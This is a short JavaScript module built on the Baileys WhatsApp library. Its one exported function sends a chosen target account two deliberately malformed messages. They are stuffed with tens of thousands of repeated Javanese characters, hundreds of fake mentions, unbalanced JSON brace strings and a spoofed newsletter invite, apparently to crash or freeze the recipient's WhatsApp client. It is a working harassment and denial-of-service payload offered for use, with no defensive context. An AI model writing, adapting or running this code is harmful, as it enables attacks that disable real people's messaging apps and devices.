const { prepareWAMessageMedia } = require("@whiskeysockets/baileys");

async function blankLagi(sock, target) {
  const media = await prepareWAMessageMedia(
    { image: { url: "https://i.postimg.cc/D0VjjHWn/file-00000000083482068d50b99993db8182.png" } },
    { upload: sock.waUploadToServer }
  );

  try {
    const Msg = {
      extendedTextMessage: {
        text: "Makan Blank Bang" + "ꦾ".repeat(6000),
        contextInfo: {
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from(
              { length: 700 },
              () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
            )
          ],
          stanzaId: sock.generateMessageTag(),
          participant: target,
          quotedMessage: {
            conversation: "ꦾ".repeat(60000)
          }
        },
        nativeFlowMessage: {
          messageParamsJson: "{".repeat(10000)
        }
      }
    };

    await sock.relayMessage(target, Msg, {
      messageId: sock.generateMessageTag()
    });

    const newsletterMsg = {
      botInvokeMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "1@newsletter",
            newsletterName: "Snith Point",
            jpegThumbnail: media,
            caption: "ꦾ".repeat(3000),
            inviteExpiration: Date.now() + 9999999999
          }
        }
      },
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000)
      },
      contextInfo: {
        remoteJid: target,
        participant: target,
        stanzaId: sock.generateMessageTag(),
        quotedMessage: {
          conversation: "ꦾ".repeat(60000)
        }
      }
    };

    await sock.relayMessage(target, newsletterMsg, {
      messageId: sock.generateMessageTag()
    });

  } catch (err) {
    console.error("Error in blankLagi:", err);
  }
}

module.exports = { blankLagi };
